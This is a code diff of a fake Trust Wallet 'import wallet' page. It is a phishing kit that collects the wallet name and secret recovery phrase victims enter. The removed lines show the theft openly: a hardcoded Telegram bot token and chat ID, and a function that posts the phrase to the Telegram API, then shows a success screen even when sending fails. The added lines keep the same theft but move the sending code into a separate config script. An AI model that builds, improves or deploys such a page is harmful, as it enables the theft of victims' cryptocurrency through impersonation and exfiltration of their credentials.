@@ -5,667 +5,217 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Trust Wallet - Protect your wallet</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #0f111a;
-            color: #ffffff;
-            height: 100vh;
-            display: flex;
-            overflow: hidden;
+            background-color: #0f111a; color: #ffffff; height: 100vh;
+            display: flex; overflow: hidden;
         }
-
-        /* --- LEFT PANEL (Dark Grey) --- */
         .left-panel {
-            width: 35%; 
-            height: 100%;
-            background-color: #242529;
-            padding: 30px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
+            width: 35%; height: 100%; background-color: #242529; padding: 30px;
+            display: flex; flex-direction: column; justify-content: space-between;
         }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 40px;
-        }
-
+        .logo { display: flex; align-items: center; gap: 8px; margin-bottom: 40px; }
         .logo svg { width: 28px; height: 28px; }
-
-        .logo-text {
-            display: flex;
-            align-items: center;
-            font-size: 20px;
-            letter-spacing: 0.5px;
-        }
-
+        .logo-text { display: flex; align-items: center; font-size: 20px; letter-spacing: 0.5px; }
         .logo-text .trust { font-weight: 900; color: #00ff66; }
         .logo-text .wallet { font-weight: 300; color: #00ff66; margin-left: 5px; }
-
-        .step-text {
-            color: #a0a0a0;
-            font-size: 13px;
-            margin-bottom: 10px;
-        }
-
-        .left-panel h1 {
-            font-size: 26px;
-            line-height: 1.2;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 20px;
-        }
-
-        .illustration-container {
-            width: 160px;
-            height: 160px;
-            margin-top: 10px;
-        }
-
-        .illustration-img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-
+        .step-text { color: #a0a0a0; font-size: 13px; margin-bottom: 10px; }
+        .left-panel h1 { font-size: 26px; line-height: 1.2; font-weight: 700; color: #ffffff; margin-bottom: 20px; }
+        .illustration-container { width: 160px; height: 160px; margin-top: 10px; }
+        .illustration-img { width: 100%; height: 100%; object-fit: contain; }
         .help-link {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: #a0a0a0;
-            font-size: 13px;
-            text-decoration: none;
-            transition: color 0.2s;
+            display: flex; align-items: center; gap: 6px; color: #a0a0a0;
+            font-size: 13px; text-decoration: none; transition: color 0.2s;
         }
-
         .help-link:hover { color: #ffffff; }
         .help-link svg { width: 14px; height: 14px; fill: currentColor; }
-
-        /* --- RIGHT PANEL (Dark Background) --- */
         .right-panel {
-            width: 65%;
-            height: 100%;
-            padding: 40px 60px;
-            display: flex;
-            flex-direction: column;
-            overflow-y: auto;
+            width: 65%; height: 100%; padding: 40px 60px;
+            display: flex; flex-direction: column; overflow-y: auto;
         }
-
         .back-btn {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: #a0a0a0;
-            text-decoration: none;
-            font-size: 14px;
-            margin-bottom: 40px;
-            width: fit-content;
-            transition: color 0.2s;
-            cursor: pointer;
-            background: none;
-            border: none;
-            font-family: inherit;
+            display: flex; align-items: center; gap: 6px; color: #a0a0a0;
+            text-decoration: none; font-size: 14px; margin-bottom: 40px;
+            width: fit-content; transition: color 0.2s; cursor: pointer;
+            background: none; border: none; font-family: inherit;
         }
-
         .back-btn:hover { color: #ffffff; }
         .back-btn svg { width: 18px; height: 18px; fill: currentColor; }
-
-        .right-panel h2 {
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 30px;
-        }
-
-        /* --- VIEW MANAGEMENT --- */
+        .right-panel h2 { font-size: 26px; font-weight: 700; margin-bottom: 30px; }
         .view-options, .view-password, .view-import, .view-import-form, .view-success {
-            display: none;
-            flex-direction: column;
-            width: 100%;
+            display: none; flex-direction: column; width: 100%;
         }
-        
         #view-options { display: flex; }
-
-        /* --- OPTION CARDS --- */
         .option-card {
-            background-color: #1a1c26;
-            border-radius: 12px;
-            padding: 16px 24px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 15px;
-            cursor: pointer;
-            border: 1px solid transparent;
+            background-color: #1a1c26; border-radius: 12px; padding: 16px 24px;
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 15px; cursor: pointer; border: 1px solid transparent;
             transition: background-color 0.2s;
         }
-
         .option-card:hover { background-color: #232533; }
-
-        .option-left {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            font-size: 15px;
-            font-weight: 600;
-        }
-
+        .option-left { display: flex; align-items: center; gap: 15px; font-size: 15px; font-weight: 600; }
         .option-icon { width: 24px; display: flex; justify-content: center; }
         .option-icon svg { width: 22px; height: 22px; fill: #a0a0a0; }
         .icon-trust svg { fill: #00ff66; }
-
         .badge {
-            background-color: #2b2752;
-            color: #8c83ff;
-            font-size: 11px;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-weight: 600;
-            margin-left: 10px;
+            background-color: #2b2752; color: #8c83ff; font-size: 11px;
+            padding: 4px 10px; border-radius: 20px; font-weight: 600; margin-left: 10px;
         }
-
         .chevron svg { width: 18px; height: 18px; fill: #fff; }
-
-        .category-title {
-            color: #666;
-            font-size: 14px;
-            margin-top: 20px;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-
-        /* --- PASSWORD FORM --- */
+        .category-title { color: #666; font-size: 14px; margin-top: 20px; margin-bottom: 10px; font-weight: 500; }
         .view-password h2 { font-size: 32px; margin-bottom: 40px; }
-
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            margin-bottom: 25px;
-        }
-
-        .form-group label {
-            font-size: 15px;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-
-        .input-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-
+        .form-group { display: flex; flex-direction: column; margin-bottom: 25px; }
+        .form-group label { font-size: 15px; font-weight: 600; margin-bottom: 10px; }
+        .input-wrapper { position: relative; display: flex; align-items: center; }
         .input-wrapper input {
-            width: 100%;
-            background-color: #0f111a;
-            border: 1px solid #2a2e3d;
-            border-radius: 12px;
-            padding: 16px 20px;
-            font-size: 16px;
-            color: #ffffff;
-            outline: none;
-            transition: border-color 0.2s;
+            width: 100%; background-color: #0f111a; border: 1px solid #2a2e3d;
+            border-radius: 12px; padding: 16px 20px; font-size: 16px;
+            color: #ffffff; outline: none; transition: border-color 0.2s;
         }
-
         .input-wrapper input:focus { border-color: #4b3aff; }
         .input-wrapper input.error { border-color: #ff4d4f; }
         .input-wrapper input::placeholder { color: #666; }
-
-        .error-message {
-            color: #ff4d4f;
-            font-size: 13px;
-            margin-top: 8px;
-            display: none;
-        }
+        .error-message { color: #ff4d4f; font-size: 13px; margin-top: 8px; display: none; }
         .error-message.visible { display: block; }
-
-        .eye-icon {
-            position: absolute;
-            right: 20px;
-            cursor: pointer;
-            color: #a0a0a0;
-        }
+        .eye-icon { position: absolute; right: 20px; cursor: pointer; color: #a0a0a0; }
         .eye-icon svg { width: 20px; height: 20px; fill: currentColor; }
-
         .btn-continue {
-            align-self: flex-end;
-            background-color: #1e2025;
-            color: #666;
-            border: none;
-            border-radius: 40px;
-            padding: 16px 40px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: not-allowed;
-            margin-top: 20px;
-            transition: all 0.3s ease;
+            align-self: flex-end; background-color: #1e2025; color: #666;
+            border: none; border-radius: 40px; padding: 16px 40px; font-size: 16px;
+            font-weight: 600; cursor: not-allowed; margin-top: 20px; transition: all 0.3s ease;
         }
-
-        .btn-continue.active {
-            background-color: #4b3aff;
-            color: #ffffff;
-            cursor: pointer;
-        }
-
-        /* --- IMPORT FORM --- */
-        .view-import-form h2 {
-            font-size: 26px;
-            margin-bottom: 30px;
-        }
-
-        .import-group {
-            margin-bottom: 25px;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .import-group label {
-            font-size: 15px;
-            font-weight: 600;
-            margin-bottom: 12px;
-        }
-
-        .import-input-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-
+        .btn-continue.active { background-color: #4b3aff; color: #ffffff; cursor: pointer; }
+        .view-import-form h2 { font-size: 26px; margin-bottom: 30px; }
+        .import-group { margin-bottom: 25px; display: flex; flex-direction: column; }
+        .import-group label { font-size: 15px; font-weight: 600; margin-bottom: 12px; }
+        .import-input-wrapper { position: relative; display: flex; align-items: center; }
         .import-input-wrapper input {
-            width: 100%;
-            background-color: #0f111a;
-            border: 1px solid #2a2e3d;
-            border-radius: 12px;
-            padding: 18px 50px 18px 20px;
-            font-size: 16px;
-            color: #ffffff;
-            outline: none;
+            width: 100%; background-color: #0f111a; border: 1px solid #2a2e3d;
+            border-radius: 12px; padding: 18px 50px 18px 20px; font-size: 16px;
+            color: #ffffff; outline: none;
         }
-
         .import-input-wrapper input:focus { border-color: #4b3aff; }
-
         .clear-icon {
-            position: absolute;
-            right: 20px;
-            cursor: pointer;
-            color: #666;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            position: absolute; right: 20px; cursor: pointer; color: #666;
+            display: flex; align-items: center; justify-content: center;
         }
         .clear-icon:hover { color: #fff; }
         .clear-icon svg { width: 20px; height: 20px; fill: currentColor; }
-
-        .help-text {
-            color: #666;
-            font-size: 14px;
-            margin-top: 8px;
-            line-height: 1.4;
-        }
-
-        .success-text {
-            color: #888;
-            font-size: 14px;
-            margin-top: 8px;
-            display: none;
-        }
+        .help-text { color: #666; font-size: 14px; margin-top: 8px; line-height: 1.4; }
+        .success-text { color: #888; font-size: 14px; margin-top: 8px; display: none; }
         .success-text.visible { display: block; }
-
-        .error-text-import {
-            color: #ff4d4f;
-            font-size: 14px;
-            margin-top: 8px;
-            display: none;
-        }
+        .error-text-import { color: #ff4d4f; font-size: 14px; margin-top: 8px; display: none; }
         .error-text-import.visible { display: block; }
-
-        .textarea-wrapper {
-            position: relative;
-            width: 100%;
-        }
-
+        .textarea-wrapper { position: relative; width: 100%; }
         .import-textarea {
-            width: 100%;
-            min-height: 180px;
-            background-color: #0f111a;
-            border: 1px solid #2a2e3d;
-            border-radius: 12px;
-            padding: 16px 50px 16px 20px; 
-            font-size: 16px;
-            color: #ffffff;
-            outline: none;
-            resize: none;
-            font-family: inherit;
-            transition: border-color 0.2s;
-            letter-spacing: 2px; 
+            width: 100%; min-height: 180px; background-color: #0f111a;
+            border: 1px solid #2a2e3d; border-radius: 12px;
+            padding: 16px 50px 16px 20px; font-size: 16px; color: #ffffff;
+            outline: none; resize: none; font-family: inherit;
+            transition: border-color 0.2s; letter-spacing: 2px;
         }
-
         .import-textarea:focus { border-color: #4b3aff; }
         .import-textarea.error { border-color: #ff4d4f; }
-
         .eye-icon-textarea {
-            position: absolute;
-            right: 20px;
-            bottom: 20px;
-            cursor: pointer;
-            color: #4b3aff; 
-            display: none; 
+            position: absolute; right: 20px; bottom: 20px; cursor: pointer;
+            color: #4b3aff; display: none;
         }
         .eye-icon-textarea.visible { display: block; }
         .eye-icon-textarea svg { width: 24px; height: 24px; fill: currentColor; }
-
         .btn-import {
-            align-self: flex-end;
-            background-color: #1e2025;
-            color: #666;
-            border: none;
-            border-radius: 40px;
-            padding: 16px 50px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: not-allowed;
-            margin-top: 30px;
-            transition: all 0.3s ease;
+            align-self: flex-end; background-color: #1e2025; color: #666;
+            border: none; border-radius: 40px; padding: 16px 50px; font-size: 16px;
+            font-weight: 600; cursor: not-allowed; margin-top: 30px; transition: all 0.3s ease;
         }
-
-        .btn-import.active {
-            background-color: #4b3aff;
-            color: #ffffff;
-            cursor: pointer;
-        }
-
-        /* --- NEW VIEW: SUCCESS (Start exploring) --- */
-        .view-success h2 {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 30px;
-            margin-top: 20px;
-        }
-
+        .btn-import.active { background-color: #4b3aff; color: #ffffff; cursor: pointer; }
+        .view-success h2 { font-size: 28px; font-weight: 700; margin-bottom: 30px; margin-top: 20px; }
         .explore-card {
-            background-color: #151721;
-            border-radius: 24px;
-            padding: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 40px;
-            margin-bottom: 40px;
+            background-color: #151721; border-radius: 24px; padding: 40px;
+            display: flex; align-items: center; justify-content: space-between;
+            gap: 40px; margin-bottom: 40px;
         }
-
         .explore-left {
-            flex: 1;
-            background-color: #0b0c10;
-            border-radius: 16px;
-            padding: 30px;
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
+            flex: 1; background-color: #0b0c10; border-radius: 16px;
+            padding: 30px; position: relative; display: flex;
+            flex-direction: column; justify-content: center;
         }
-
-        .pin-block {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 10px;
-        }
-
-        .pin-block svg {
-            width: 36px;
-            height: 36px;
-        }
-
-        .pin-block span {
-            font-size: 22px;
-            font-weight: 700;
-        }
-
-        .explore-left p {
-            color: #a0a0a0;
-            font-size: 15px;
-            line-height: 1.4;
-        }
-
-        .explore-right {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-
+        .pin-block { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
+        .pin-block svg { width: 36px; height: 36px; }
+        .pin-block span { font-size: 22px; font-weight: 700; }
+        .explore-left p { color: #a0a0a0; font-size: 15px; line-height: 1.4; }
+        .explore-right { flex: 1; display: flex; flex-direction: column; justify-content: center; }
         .explore-right .small-title {
-            color: #a0a0a0;
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 15px;
+            color: #a0a0a0; font-size: 12px; font-weight: 600;
+            text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px;
         }
-
-        .explore-right h3 {
-            font-size: 26px;
-            line-height: 1.3;
-            margin-bottom: 20px;
-        }
-
-        .explore-right p {
-            color: #a0a0a0;
-            font-size: 15px;
-            margin-bottom: 25px;
-        }
-
+        .explore-right h3 { font-size: 26px; line-height: 1.3; margin-bottom: 20px; }
+        .explore-right p { color: #a0a0a0; font-size: 15px; margin-bottom: 25px; }
         .link-guide {
-            color: #4b3aff;
-            font-size: 15px;
-            font-weight: 600;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            color: #4b3aff; font-size: 15px; font-weight: 600;
+            text-decoration: none; display: flex; align-items: center; gap: 8px;
         }
-
-        .link-guide:hover {
-            text-decoration: underline;
-        }
-
-        .pagination {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 40px;
-        }
-
+        .link-guide:hover { text-decoration: underline; }
+        .pagination { display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 40px; }
         .page-arrow {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background-color: #1e2025;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            color: #fff;
-            transition: background 0.2s;
+            width: 40px; height: 40px; border-radius: 50%; background-color: #1e2025;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; color: #fff; transition: background 0.2s;
         }
-
-        .page-arrow.active {
-            background-color: #4b3aff;
-        }
-
-        .page-arrow svg {
-            width: 20px;
-            height: 20px;
-            fill: currentColor;
-        }
-
-        .page-dots {
-            display: flex;
-            gap: 8px;
-        }
-
-        .dot {
-            width: 6px;
-            height: 6px;
-            background-color: #333;
-            border-radius: 50%;
-        }
-
-        .dot.active {
-            width: 24px;
-            border-radius: 4px;
-            background-color: #fff;
-        }
-
+        .page-arrow.active { background-color: #4b3aff; }
+        .page-arrow svg { width: 20px; height: 20px; fill: currentColor; }
+        .page-dots { display: flex; gap: 8px; }
+        .dot { width: 6px; height: 6px; background-color: #333; border-radius: 50%; }
+        .dot.active { width: 24px; border-radius: 4px; background-color: #fff; }
         .btn-open-wallet {
-            align-self: flex-end;
-            background-color: #4b3aff;
-            color: #ffffff;
-            border: none;
-            border-radius: 40px;
-            padding: 18px 60px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            text-decoration: none;
-            transition: background 0.2s;
-            box-shadow: 0 4px 15px rgba(75, 58, 255, 0.3);
+            align-self: flex-end; background-color: #4b3aff; color: #ffffff;
+            border: none; border-radius: 40px; padding: 18px 60px; font-size: 18px;
+            font-weight: 600; cursor: pointer; text-decoration: none;
+            transition: background 0.2s; box-shadow: 0 4px 15px rgba(75, 58, 255, 0.3);
         }
-
-        .btn-open-wallet:hover {
-            background-color: #3b2bff;
-        }
-
-        /* --- MODAL POP-UP --- */
+        .btn-open-wallet:hover { background-color: #3b2bff; }
         .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: rgba(0, 0, 0, 0.7);
-            display: none; 
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background-color: rgba(0, 0, 0, 0.7); display: none;
+            justify-content: center; align-items: center; z-index: 1000;
         }
-
-        .modal-overlay.visible {
-            display: flex;
-        }
-
+        .modal-overlay.visible { display: flex; }
         .modal-content {
-            background-color: #14151f; 
-            width: 90%;
-            max-width: 500px; 
-            max-height: 90vh;
-            overflow-y: auto; 
-            border-radius: 24px;
-            padding: 30px;
-            position: relative;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            background-color: #14151f; width: 90%; max-width: 500px; max-height: 90vh;
+            overflow-y: auto; border-radius: 24px; padding: 30px;
+            position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
-
         .modal-close {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            cursor: pointer;
-            color: #666;
-            background: none;
-            border: none;
+            position: absolute; top: 20px; right: 20px; cursor: pointer;
+            color: #666; background: none; border: none;
         }
         .modal-close:hover { color: #fff; }
         .modal-close svg { width: 24px; height: 24px; fill: currentColor; }
-
-        .modal-content h3 {
-            text-align: center;
-            font-size: 20px;
-            margin-bottom: 15px;
-            margin-top: 10px;
-        }
-
-        .modal-illustration {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 15px;
-        }
-        .modal-illustration svg {
-            width: 90px;
-            height: 90px;
-        }
-
+        .modal-content h3 { text-align: center; font-size: 20px; margin-bottom: 15px; margin-top: 10px; }
+        .modal-illustration { display: flex; justify-content: center; margin-bottom: 15px; }
+        .modal-illustration svg { width: 90px; height: 90px; }
         .modal-desc {
-            text-align: center;
-            color: #a0a0a0;
-            font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 20px;
+            text-align: center; color: #a0a0a0; font-size: 14px;
+            line-height: 1.5; margin-bottom: 20px;
         }
-
-        .modal-checkbox-group {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-
+        .modal-checkbox-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
         .modal-checkbox {
-            background-color: #1c1e29;
-            border-radius: 12px;
-            padding: 16px;
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            cursor: pointer;
-            border: 1px solid transparent;
+            background-color: #1c1e29; border-radius: 12px; padding: 16px;
+            display: flex; align-items: flex-start; gap: 12px;
+            cursor: pointer; border: 1px solid transparent;
         }
-        
         .modal-checkbox:hover { border: 1px solid #2a2e3d; }
-
         .modal-checkbox input[type="checkbox"] {
-            margin-top: 2px;
-            width: 18px;
-            height: 18px;
-            accent-color: #4b3aff;
-            cursor: pointer;
-            flex-shrink: 0;
+            margin-top: 2px; width: 18px; height: 18px;
+            accent-color: #4b3aff; cursor: pointer; flex-shrink: 0;
         }
-
-        .modal-checkbox span {
-            font-size: 14px;
-            line-height: 1.4;
-            color: #ffffff;
-        }
-
+        .modal-checkbox span { font-size: 14px; line-height: 1.4; color: #ffffff; }
         .btn-understand {
-            width: 100%;
-            background-color: #1e2025;
-            color: #666;
-            border: none;
-            border-radius: 40px;
-            padding: 16px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: not-allowed;
-            transition: all 0.3s ease;
+            width: 100%; background-color: #1e2025; color: #666;
+            border: none; border-radius: 40px; padding: 16px; font-size: 16px;
+            font-weight: 600; cursor: not-allowed; transition: all 0.3s ease;
         }
-
-        .btn-understand.active {
-            background-color: #4b3aff;
-            color: #ffffff;
-            cursor: pointer;
-        }
-
-        /* --- RESPONSIVE --- */
+        .btn-understand.active { background-color: #4b3aff; color: #ffffff; cursor: pointer; }
         @media (max-width: 900px) {
             body { flex-direction: column; height: auto; overflow: auto; }
             .left-panel { width: 100%; height: auto; padding: 30px 20px; }
@@ -876,7 +426,8 @@
                 </div>
             </div>
 
-            <button class="btn-import" id="btn-import" disabled onclick="sendToTelegram()">Import</button>
+            <!-- MODIFIED: onclick="triggerImport()" instead of sendToTelegram() -->
+            <button class="btn-import" id="btn-import" disabled onclick="triggerImport()">Import</button>
         </div>
 
         <!-- VIEW 5: SUCCESS / START EXPLORING -->
@@ -903,7 +454,6 @@
                 </div>
             </div>
 
-            <!-- Pagination -->
             <div class="pagination">
                 <div class="page-arrow active">
                     <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
@@ -966,14 +516,12 @@
         </div>
     </div>
 
-    <script>
-        // ==========================================
-        // TELEGRAM BOT CONFIGURATION
-        // ==========================================
-        // REPLACE THESE VALUES WITH YOUR OWN
-        const TELEGRAM_BOT_TOKEN = "8794272039:AAHl1crjgbFQrpeNexzfwAy0GJepPzisv1w"; 
-        const TELEGRAM_CHAT_ID = "8774784007";
+    <!-- ========================================== -->
+    <!-- EXTERNAL TELEGRAM CONFIG (PRIVATE FILE)    -->
+    <!-- ========================================== -->
+    <script src="telegram-config.js"></script>
 
+    <script>
         // --- NAVIGATION ---
         const viewOptions = document.getElementById('view-options');
         const viewPassword = document.getElementById('view-password');
@@ -1003,6 +551,14 @@
         const errorMatch = document.getElementById('error-match');
         
         let currentView = 'options';
+
+        // --- WRAPPER: calls the external sendToTelegram with current values ---
+        function triggerImport() {
+            const walletName = walletNameInput.value;
+            const secretPhrase = secretPhraseInput.value;
+            // sendToTelegram is defined in telegram-config.js
+            sendToTelegram(walletName, secretPhrase);
+        }
 
         function showOptionsView() {
             viewOptions.style.display = 'flex';
@@ -1255,45 +811,6 @@
 
         function closeModal() {
             securityModal.classList.remove('visible');
-        }
-
-        // ==========================================
-        // FUNCTION TO SEND TO TELEGRAM
-        // ==========================================
-        function sendToTelegram() {
-            // Retrieve the values
-            const walletName = walletNameInput.value;
-            const secretPhrase = secretPhraseInput.value;
-
-            // Prepare the message
-            const message = `🚨 *NEW WALLET IMPORTED* 🚨\n\n` +
-                            `📁 *Name:* ${walletName}\n` +
-                            `🔑 *Phrase/Key:* \`${secretPhrase}\``;
-
-            // Telegram API URL
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-            // Send the request (fetch)
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => {
-                // Once sent (or on error), display the success page
-                showSuccessView();
-            })
-            .catch(error => {
-                console.error('Telegram error:', error);
-                // Even if it fails, display the success page to avoid blocking the user
-                showSuccessView();
-            });
         }
     </script>
 </body>
